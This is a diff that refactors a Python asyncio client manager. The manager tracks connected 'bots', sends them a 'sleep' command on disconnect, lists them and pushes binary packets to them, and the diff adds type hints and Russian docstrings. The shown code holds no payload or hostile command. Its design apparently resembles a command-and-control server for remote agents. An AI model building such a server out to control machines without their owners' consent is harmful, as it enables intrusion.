@@ -1,35 +1,94 @@
 # backend/Services/ClientManager.py
-import asyncio, backend.LoggerWrapper as logger
+
+import asyncio
+from typing import Any, Dict, List, Optional, Tuple
+
+import backend.LoggerWrapper as logger
 from .network import pack_packet
 
-# Глобальное состояние
-active_clients, preview_cache = {}, {}
+active_clients: Dict[str, Tuple[asyncio.StreamReader, asyncio.StreamWriter]] = {}
+preview_cache: Dict[str, bytes] = {}
 
-async def close_client(bid, send_sleep=True):
-    "Завершение сессии бота"
-    if not (s := active_clients.pop(bid, None)): return False
-    reader, writer = s
+
+async def close_client(bot_identifier: str, send_sleep_command: bool = True) -> bool:
+    """
+    Завершает сессию конкретного бота и закрывает сетевое соединение.
+    
+    Схема отключения:
+    [Command: sleep] -> [Close Socket] -> [Remove from active_clients]
+    """
+    client_session: Optional[Tuple[asyncio.StreamReader, asyncio.StreamWriter]] = active_clients.pop(
+        bot_identifier, 
+        None
+    )
+
+    if not client_session:
+        return False
+
+    reader, writer = client_session
+
     try:
-        if send_sleep: writer.write(b"sleep\n"); await writer.drain()
-        writer.close(); await writer.wait_closed()
-    except: pass
-    finally: logger.Log.info(f"[Manager] {bid} disconnected")
+        if send_sleep_command:
+            writer.write(b"sleep\n")
+            await writer.drain()
+        
+        writer.close()
+        await writer.wait_closed()
+    except Exception:
+        pass
+    finally:
+        logger.Log.info(f"[ClientManager] {bot_identifier} disconnected")
+    
     return True
 
-async def close_all_clients():
-    "Массовое отключение"
-    if not active_clients: return 0
-    res = await asyncio.gather(*[close_client(bid) for bid in list(active_clients.keys())])
-    return len(res)
 
-def list_clients():
-    "Список онлайн-клиентов"
-    return [{"id": bid, "status": "online"} for bid in active_clients]
+async def close_all_clients() -> int:
+    """
+    Выполняет массовое параллельное отключение всех активных ботов.
+    
+    Схема:
+    [List IDs] -> [asyncio.gather] -> [Return Count]
+    """
+    if not active_clients:
+        return 0
 
-async def send_binary_to_bot(bid, pkg):
-    "Отправка данных боту"
-    if not (s := active_clients.get(bid)): return False
+    bot_identifiers: List[str] = list(active_clients.keys())
+    disconnection_tasks: List[Any] = [close_client(bot_id) for bot_id in bot_identifiers]
+    
+    results: List[bool] = await asyncio.gather(*disconnection_tasks)
+    
+    return len(results)
+
+
+def list_clients() -> List[Dict[str, str]]:
+    """
+    Формирует список текущих онлайн-клиентов для API.
+    
+    Data Scheme:
+    [{"id": str, "status": "online"}, ...]
+    """
+    return [{"id": bot_id, "status": "online"} for bot_id in active_clients]
+
+
+async def send_binary_to_bot(bot_identifier: str, binary_packet: bytes) -> bool:
+    """
+    Транспортировка бинарного пакета до конечного сокета бота.
+    
+    Data Scheme:
+    [Binary Packet] -> transport.write() -> transport.drain()
+    """
+    client_session: Optional[Tuple[asyncio.StreamReader, asyncio.StreamWriter]] = active_clients.get(
+        bot_identifier
+    )
+
+    if not client_session:
+        return False
+
     try:
-        s[1].write(pkg); await s[1].drain(); return True
-    except Exception as e:
-        logger.Log.error(f"[Manager] Send err {bid}: {e}"); return False
+        writer: asyncio.StreamWriter = client_session[1]
+        writer.write(binary_packet)
+        await writer.drain()
+        return True
+    except Exception as error:
+        logger.Log.error(f"[ClientManager] Send error to {bot_identifier}: {error}")
+        return False
